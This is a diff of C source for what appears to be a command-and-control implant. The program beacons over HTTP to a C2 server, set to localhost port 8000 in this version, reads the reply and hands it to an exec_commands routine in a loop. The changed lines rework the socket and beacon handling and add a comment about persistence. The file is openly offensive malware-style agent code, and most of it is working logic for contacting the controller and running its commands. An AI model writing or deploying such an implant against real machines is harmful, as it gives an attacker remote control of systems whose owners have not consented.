@@ -14,15 +14,16 @@
 #include "colors.h"
 
 #define RHOST "127.0.0.1"
-#define RPORT 4444
-#define RPORT_STR "4444"
+#define RPORT 8000
+#define RPORT_STR "8000"
 #define BEACON_RESP_MAX_SIZE 2048
 
 #define ABORT (-1)
 #define RETRY_LATER 0
 #define OK 1
 
-int timeout = 60;		// seconds
+int timeout = 15;		// seconds
+//int ID = 0; // need to ensure persistence
 
 int connect_to_c2(const char *host, int port)
 {
@@ -75,42 +76,22 @@ int connect_to_c2(const char *host, int port)
 char *build_http_request(char *data)
 {
 	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
+
 	if (http_req != NULL) {
-		sprintf(http_req, "GET /beacon HTTP/1.1\r\n"
-			"Host: " RHOST ":" RPORT_STR "\r\n\r\n%s", data);
+		sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
+			"Host: " RHOST ":" RPORT_STR "\r\n"
+			"Content-Length: %d\r\n\r\n%s", strlen(data), data);
 	}
 
 	return http_req;
 }
 
-int send_data(int sockfd, char *data, size_t data_len)
+char *get_beacon_resp(int sockfd)
 {
-	if (data == NULL)
-		return ABORT;
-
-	char *pos = data;
-
-	while (data_len > 0) {
-		int numsent = send(sockfd, pos, data_len, 0);
-		if (numsent >= 0) {
-			data_len -= numsent;
-			if (data_len)
-				pos += numsent;
-		} else {
-			printf("send: %s\n", strerror(errno));
-			return RETRY_LATER;	/* Problems, retry later */
-		}
-	}
-
-	return OK;
-}
-
-void get_beacon_resp(int sockfd, char **resp)
-{
-	char *buf = malloc(BEACON_RESP_MAX_SIZE);
+	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
 	if (buf == NULL) {
 		printf("malloc\n");
-		*resp = NULL;
+		return NULL;
 	}
 
 	/* Should read HTTP header to make sure the entire reply
@@ -118,60 +99,61 @@ void get_beacon_resp(int sockfd, char **resp)
 	printf("[*] Waiting for c2 server to reply...");
 	fflush(stdout);
 	int received = 0;
-	ssize_t numread = recv(sockfd, buf, BEACON_RESP_MAX_SIZE, 0);
-	if (numread > 0) {
-		printf("received %d bytes\n", numread);
-		received = 1;
-	} else if (numread == 0) {
-		printf("connection closed\n");
-	} else if (numread == -1) {
-		if (errno == EAGAIN && errno == EWOULDBLOCK) {
-			printf("timed out\n");
-		} else {
-			printf("error\n");
+	int tot_read = 0;
+	ssize_t numread = 0;
+	char *pos = buf;
+	do {
+		numread = recv(sockfd, pos, BEACON_RESP_MAX_SIZE - tot_read, 0);
+		if (numread > 0) {
+			tot_read += numread;
+			pos += numread;
+			//printf("received %d bytes\n", numread);
+			received = 1;
+		} else if (numread == 0) {
+			printf("received %d bytes\n", tot_read);
+		} else if (numread == -1) {
+			if (errno == EAGAIN && errno == EWOULDBLOCK) {
+				printf(RED("timed out\n"));
+			} else {
+				printf(RED("error\n"));
+			}
 		}
-	}
+	} while (numread > 0);
 
-	if (received == 1) {
-		*resp = buf;
-	} else {
-		free(buf);
-		*resp = NULL;
-	}
+	return buf;
+	//else
+	//      free(buf);
 }
 
-int send_and_wait(char *request, size_t request_len, char **response)
+int send_beacon(int sockfd, char *request, size_t request_len)
 {
 	if (request == NULL || request_len == 0)
-		return -1;	/* If no beacon can be retrieved, abort */
+		return ABORT;	/* If no beacon could be retrieved, abort */
 
-	int sockfd;
-	int ret = connect_to_c2(RHOST, RPORT);
-	if (ret == ABORT || ret == RETRY_LATER)
-		return ret;
+	printf("[*] Sending HTTP request to server:\n%s\n", request);
 
-	sockfd = ret;
-
-	ret = send_data(sockfd, request, request_len);
-	if (ret == ABORT) {
-		printf("[*] Closing socket\n");
-		close(sockfd);
-		return ABORT;
-	} else if (ret == RETRY_LATER) {
-		printf("[*] Could not send beacon, will retry\n");
-		printf("[*] Closing socket\n");
-		close(sockfd);
-		return RETRY_LATER;
+	int numsent;
+	char *pos = request;
+	while (request_len > 0) {
+		numsent = send(sockfd, pos, request_len, 0);
+		if (numsent >= 0) {
+			request_len -= numsent;
+			if (request_len)
+				pos += numsent;
+		} else {
+			printf("[*] Error: %s\n", strerror(errno));
+			printf("[*] Could not send beacon, will retry\n");
+			printf("[*] Closing socket\n");
+			return RETRY_LATER;
+		}
 	}
 
 	printf("[*] Beacon sent\n");
 
-	get_beacon_resp(sockfd, response);
-
-	printf("[*] Closing socket\n");
-	close(sockfd);
-
 	return OK;
+
+	//printf("[*] Closing socket\n");
+	//close(sockfd);
 }
 
 int main(int argc, char *argv[])
@@ -192,30 +174,47 @@ int main(int argc, char *argv[])
 	}
 	printf(GREEN("done\n"));
 
-	char *response = NULL;
 	while (1) {
-		int ret =
-		    send_and_wait(http_request, strlen(http_request),
-				  &response);
+		int sockfd, ret;
+		ret = connect_to_c2(RHOST, RPORT);
 		if (ret == ABORT) {
-			free(beacon);
-			free(http_request);
+			/* We don't have a working socket */
 			break;
 		} else if (ret == RETRY_LATER) {
+			/* We don't have a working socket */
+			sleep(timeout);
+			continue;
+		}
+		/* We have a working socket */
+		sockfd = ret;
+
+		ret = send_beacon(sockfd, http_request, strlen(http_request));
+		if (ret == ABORT) {
+			close(sockfd);
+			break;
+		} else if (ret == RETRY_LATER) {
+			close(sockfd);
 			printf(YELLOW
 			       ("[*] Sleep %d seconds before retrying..."),
 			       timeout);
 			fflush(stdout);
 			sleep(timeout);
 			printf("done\n");
-		} else if (response != NULL) {
+		} else {	//if (response != NULL) {
+			char *response = get_beacon_resp(sockfd);
+			/* If the response is empty or invalid, you might wanna check
+			   it here and skip the call to exec_commands */
 			printf("[*] Server response:\n%s\n", response);
-			printf("[*] Starting command execution...\n");
+			printf(BLUE("[*] Moving to execution subsystem\n"));
 			exec_commands(response);
-			printf(GREEN("[*] Commands executed\n"));
+			printf(BLUE("[*] Exiting executing subsystem\n"));
 			free(response);
+			sleep(timeout);
 		}
 	}
+
+	free(beacon);
+	free(http_request);
 
 	return 0;
 }
